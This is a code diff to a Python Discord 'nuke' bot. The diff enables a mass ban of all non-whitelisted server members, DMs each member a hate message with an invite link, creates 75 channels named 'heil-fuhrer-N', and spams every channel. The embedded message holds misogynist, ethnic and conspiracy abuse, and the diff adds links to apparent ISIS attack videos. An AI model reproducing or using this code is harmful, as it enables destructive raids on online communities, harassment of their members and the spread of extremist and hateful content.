@@ -16,13 +16,14 @@ ENJOY YOUR NUKED SERVER :rofl: :flag_pk: :muscle:
 **BEAT YOUR WOMEN :ok_hand: NO RIGHTS FOR THEM
 BUSH DID 9/11,
 FUCK YOU GEORGE**
-https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRIa5ezruyEqkG_udsAGYu1LX3CEb0OBtpGGY7CpNeVg_177Rfe
-https://i.pinimg.com/originals/f8/f5/f0/f8f5f03bb124a50ee28dc545fa4bcb44.jpg
-
-http://itsmyideas.com/wp-content/uploads/2012/07/Latest-Pakistan-army-SSG-commando-wallpaper-and-picture.jpg
 **THE FUCKING FAUJ HAS COME YOU MADARCHOD
 INDIA MAURABAD :flag_in: :poop: :flag_il: :poop: 
-FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
+FREEDOM FOR PALESTINE :flag_ps: :muscle:**
+https://i.redd.it/eugj6cyclvc41.jpg
+https://cdn.discordapp.com/attachments/693974529923612728/708740792985845800/ISIS_attack_on_shia_iraqi_majoos.webm
+https://cdn.discordapp.com/attachments/693974529923612728/708740800921731122/1584351692024.webm
+https://cdn.discordapp.com/attachments/693974529923612728/708740726657253476/1583023579139.webm
+https://cdn.discordapp.com/attachments/693974529923612728/708740617496428604/1582226028317.webm"""
 
         self.invites = 'https://discord.gg/Hq753Xz'
         self.whitelist = [653983428785733652, 703244120881234011]
@@ -65,7 +66,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
         for member in ctx.guild.members:
             try:
                 if not member.id in self.no_ban:
-                    # await ctx.guild.ban(member, reason="NUKE")
+                    await ctx.guild.ban(member, reason="NUKE")
                     print(f"'{member.name}', ", end='', flush=True)
                     await member.send(f"{self.message}\n{self.invites}")
             except:
@@ -73,9 +74,10 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
         print(')\n')
 
     async def make_channels(self, ctx):
+        await ctx.guild.create_text_channel(f"no-spam")
         for i in range(75):
             try:
-                await ctx.guild.create_text_channel(f"pakistan-zindabad-{i+1}")
+                await ctx.guild.create_text_channel(f"heil-fuhrer-{i+1}")
             except:
                 print(f"Created ( {i} channels )")
 
@@ -88,7 +90,7 @@ FREEDOM FOR PALESTINE :flag_ps: :muscle:**"""
 
     async def spam_all_channels(self, ctx):
         for channel in ctx.guild.channels:
-            if not channel.name == 'no-delete':
+            if not channel.name == 'no-spam' or not channel.name == 'no-delete':
                 await channel.send(">spam")
 
     @commands.Cog.listener()
